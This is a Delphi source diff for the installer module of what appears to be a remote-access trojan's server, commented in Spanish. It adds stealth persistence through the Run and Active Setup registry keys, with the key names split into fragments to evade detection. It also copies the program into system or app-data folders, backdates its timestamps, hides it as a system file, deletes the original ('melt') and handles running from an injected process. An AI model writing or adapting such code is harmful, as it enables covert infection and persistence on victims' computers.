@@ -9,6 +9,7 @@ uses
   vars,
   PsAPI,
   minireg,
+  SHfolder,
   SettingsDef;
 
 procedure Instalar();
@@ -24,6 +25,7 @@ function FindWindowsDir: string;
 function FindSystemDir: string;
 function FindTempDir: string;
 function FindRootDir: string;
+function GetSpecialFolderPath(folder : integer) : string;//appdir
 implementation
 
 
@@ -67,8 +69,20 @@ begin
       Clave := Clave + 'ows\CurrentVe';
       Clave := Clave + 'rsion\Run\';
       Clave := Clave + Configuracion.sRunRegKeyName;
-       RegSetString(HKEY_CURRENT_USER, clave, ParamStr(0));
+       RegSetString(HKEY_CURRENT_USER, Clave, (Configuracion.sCopyTo + Configuracion.sFileNameToCopy)+' s');
     end;
+
+    if(Configuracion.bArranqueActiveSetup) then
+    begin
+
+      Clave := 'Softw';
+      Clave := Clave + 'are\Microsoft\Ac';
+      Clave := Clave + 'tive Setup\In';
+      Clave := Clave + 'stalled Components\';
+      Clave := Clave + Configuracion.sActiveSetupKeyName+'\StubPath';
+      RegSetString(HKEY_CURRENT_USER, Clave, (Configuracion.sCopyTo + Configuracion.sFileNameToCopy)+' s');
+    end;
+    
     Sleep(20000); //20 sec
   end;
 end;
@@ -104,10 +118,7 @@ var
   FileTime:  TFileTime;
 
 begin
-  CrearThreadAutoInicio;
-  if Configuracion.bCopiarArchivo then //Si me tengo que copiar entonces...
-  begin
-    //Reemplaza las rutas adecuadas
+
     Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
       '%WinDir%\', FindWindowsDir());
     Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
@@ -116,6 +127,13 @@ begin
       '%TempDir%\', FindTempDir());
     Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
       '%RootDir%\', FindRootDir());
+    Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
+      '%AppDir%\', GetSpecialFolderPath(CSIDL_LOCAL_APPDATA));
+      
+  if Configuracion.bCopiarArchivo then //Si me tengo que copiar entonces...
+  begin
+  
+
     //Si la carpeta no existe la intento crear
 
       try
@@ -126,9 +144,9 @@ begin
         end;
       except
       end;
-  {  if not DirectoryExists(Configuracion.sCopyTo) then
-      Configuracion.sCopyTo := 'C:\';   }
-    //Osea que no la pude crear y sigue sin existir. En ese caso me instalo en el C:
+    {if not DirectoryExists(Configuracion.sCopyTo) then
+      Configuracion.sCopyTo := GetSpecialFolderPath(CSIDL_LOCAL_APPDATA));     }
+    //Osea que no la pude crear y sigue sin existir. En ese caso me instalo en el %appdir%
 
 
     if lc(ParamStr(0)) <> lc(Configuracion.sCopyTo + Configuracion.sFileNameToCopy) then
@@ -136,106 +154,90 @@ begin
       //tengo que copiarme y ejecutar la copia
     begin
       if FileExists(Configuracion.sCopyTo + Configuracion.sFileNameToCopy) then
-        //Osea que ya existe el archivo del server pero no soy yo! debe ser una version vieja instalada, borrarla y actualizar
+        //Osea que ya existe el archivo así que ya estoy instalado pero lo que pasa es que también estoy inyectado
       begin
-        try//saca de memoria el servidor viejo, y borra el archivo
-          Process32.dwSize := SizeOf(TProcessEntry32);
-          SHandle := CreateToolHelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-          if Process32First(SHandle, Process32) then
-            repeat
-              Next := Process32Next(SHandle, Process32);
-              if Next then
-                //si tienen el mismo nombre
-                if lc(Process32.szExeFile) =
-                  lc(Configuracion.sFileNameToCopy) then
-                begin
-                  Pid := IntToStr(Process32.th32ProcessID);
-                  if Pid <> '' then
-                  begin
-                    //si la ruta del proceso encontrado es la ruta del server
-                    if RutaProcesos(StrToInt(Pid)) =
-                      (Configuracion.sCopyTo + Configuracion.sFileNameToCopy) then
-                    begin
-                      //Lo asesino para poderlo borrar después
-                      try
-                        hProcess := OpenProcess(PROCESS_ALL_ACCESS, True, StrToInt(Pid));
-                        TerminateProcess(hProcess, 0);
-                      except
-                      end;
-                    end;
-                  end;
-                end;
-            until not Next;
-          CloseHandle(SHandle);
-        except
-        end;
-        //Lo intento borrar repetidamente por si no puedo a la primera :)
-        try
-          for i := 1 to 10 do
-          begin
-            BorrarArchivo(PChar(Configuracion.sCopyTo + Configuracion.sFileNameToCopy));
-            Sleep(5);
-          end;
-        except
-        end;
-      end;
-      //Ahora ya me pueedo instalar tranquilamente
+        //Se podria comprobar en el futuro si realmente es el servidor o si ya existia antes
+      end
+      else
+      begin
+       //Ahora ya me pueedo instalar tranquilamente
 
       //lo copio en Configuracion.sCopyTo
-      CopyFile(PChar(ParamStr(0)), PChar(Configuracion.sCopyTo +
-        Configuracion.sFileNameToCopy), True);
+      if(Configuracion.sInyectadorFile <> '') then//Estamos inyectados
+        CopyFile(PChar(Configuracion.sInyectadorFile+''), PChar(Configuracion.sCopyTo +
+          Configuracion.sFileNameToCopy), True)
+      else
+        CopyFile(PChar(paramstr(0)), PChar(Configuracion.sCopyTo +
+          Configuracion.sFileNameToCopy), True);
 
       //Si tengo que modificar la fecha...
-      if Configuracion.bCopiarConFechaAnterior then
-      begin
-        SHandle := FindFirstFile(PChar(Configuracion.sCopyTo + '*.*'), FoundFile);
-        if SHandle <> INVALID_HANDLE_VALUE then
+        if Configuracion.bCopiarConFechaAnterior then
         begin
-          while (string(FoundFile.cFileName) = Configuracion.sFileNameToCopy) or
-            (string(FoundFile.cFileName) = '.') or (string(FoundFile.cFileName) = '..') do
-            FindNextFile(SHandle, FoundFile);
+          SHandle := FindFirstFile(PChar(Configuracion.sCopyTo + '*.*'), FoundFile);
           if SHandle <> INVALID_HANDLE_VALUE then
-            FileTime := FoundFile.ftLastWriteTime;
-        end
-        else
-        begin
-          //No hay ningún archivo en la carpeta u ocurrió algun error, entonces escoga una fecha al azar
-          FileTime.dwLowDateTime  := Random(4294967295);
-          FileTime.dwHighDateTime := Random(4294967295);
+          begin
+            while (string(FoundFile.cFileName) = Configuracion.sFileNameToCopy) or
+            (string(FoundFile.cFileName) = '.') or (string(FoundFile.cFileName) = '..') do
+              FindNextFile(SHandle, FoundFile);
+            if SHandle <> INVALID_HANDLE_VALUE then
+              FileTime := FoundFile.ftLastWriteTime;
+          end
+          else
+          begin
+            //No hay ningún archivo en la carpeta u ocurrió algun error, entonces escoga una fecha al azar
+            FileTime.dwLowDateTime  := Random(4294967295);
+            FileTime.dwHighDateTime := Random(4294967295);
+          end;
+          Windows.FindClose(SHandle);
+          SHandle := CreateFile(PChar(Configuracion.sCopyTo +
+            Configuracion.sFileNameToCopy), Generic_write, file_share_read or
+            file_share_write, nil, open_existing, file_attribute_normal, 0);
+          if SHandle <> INVALID_HANDLE_VALUE then
+            SetFileTime(sHandle, @FileTime, @FileTime, @FileTime);
+          CloseHandle(sHandle);
         end;
-        Windows.FindClose(SHandle);
-        SHandle := CreateFile(PChar(Configuracion.sCopyTo +
-          Configuracion.sFileNameToCopy), Generic_write, file_share_read or
-          file_share_write, nil, open_existing, file_attribute_normal, 0);
-        if SHandle <> INVALID_HANDLE_VALUE then
-          SetFileTime(sHandle, @FileTime, @FileTime, @FileTime);
-        CloseHandle(sHandle);
-      end;
 
       //y lo pongo oculto, readonly y de sistema.
-      i := GetFileAttributes(PChar(Configuracion.sCopyTo +
+        i := GetFileAttributes(PChar(Configuracion.sCopyTo +
         Configuracion.sFileNameToCopy));
-      i := i or $00000002;//faHidden;   //oculto
-      i := i or $00000001;//faReadOnly; // solo lectura
-      i := i or $00000004;//faSysFile;  //de sistema
-      SetFileAttributes(PChar(Configuracion.sCopyTo + Configuracion.sFileNameToCopy), i);
+        i := i or $00000002;//faHidden;   //oculto
+        i := i or $00000001;//faReadOnly; // solo lectura
+        i := i or $00000004;//faSysFile;  //de sistema
+        SetFileAttributes(PChar(Configuracion.sCopyTo + Configuracion.sFileNameToCopy), i);
 
       //Aqui ya estoy copiado, ejecuto el archivo copiado
-      if Configuracion.bMelt = True then
-        ShellExecute(GetDesktopWindow(), 'open',
+        if Configuracion.bMelt = True then
+        begin
+          if(Configuracion.sInyectadorFile <> '') then//Estamos inyectados
+            ShellExecute(GetDesktopWindow(), 'open',
           PChar('"' + Configuracion.sCopyTo + Configuracion.sFileNameToCopy + '"'),
-          PChar('\melt ' + '"' + ParamStr(0) + '"'), nil, 0)
-      else
-        //Ejecutar sin pasarle el parametro melt
-        ShellExecute(GetDesktopWindow(), 'open',
-          PChar('"' + Configuracion.sCopyTo + Configuracion.sFileNameToCopy + '"'), '', nil, 0);
+          PChar('\melt ' + '"' + Configuracion.sInyectadorFile + '"'), nil, 0)
+          else
+          begin
+            ShellExecute(GetDesktopWindow(), 'open',
+          PChar('"' + Configuracion.sCopyTo + Configuracion.sFileNameToCopy + '"'),
+          PChar('\melt ' + '"' + ParamStr(0) + '"'), nil, 0);
+            exitprocess(0);
+          end;
+        end
+        else
 
-      //Y me suicido:
-      Halt;
+         if(Configuracion.sinyectadorfile = '') then //si no estamos inyectados tenemos que cerrar nuestro proceso
+         begin
+          ShellExecute(GetDesktopWindow(), 'open',
+          PChar('"' + Configuracion.sCopyTo + Configuracion.sFileNameToCopy + '"'), 'i', nil, 0);
+            exitprocess(0);
+         end
+         else
+         begin
+         end;
+
+      end;
+
     end;
   end;
-  //Ahora me agrego al autoinicio
 
+    CrearThreadAutoInicio;
 end;
 
 function stringreplace(s1:string;s2:string;s3:string):string;   { (copyto) windir DIR}
@@ -392,5 +394,20 @@ begin
   if DataSize <> 0 then
     Result := Copy(Result, 1, 3);
 end;
+
+function GetSpecialFolderPath(folder : integer) : string;
+const
+  SHGFP_TYPE_CURRENT = 0;
+var
+  path: array [0..MAX_PATH] of char;
+begin
+  if SUCCEEDED(SHGetFolderPath(0,folder,0,SHGFP_TYPE_CURRENT,@path[0])) then
+    Result := path
+  else
+    Result := '';
+    if Result[Length(Result)] <> '\' then
+      Result := Result + '\';
+end;
+
 
 end.
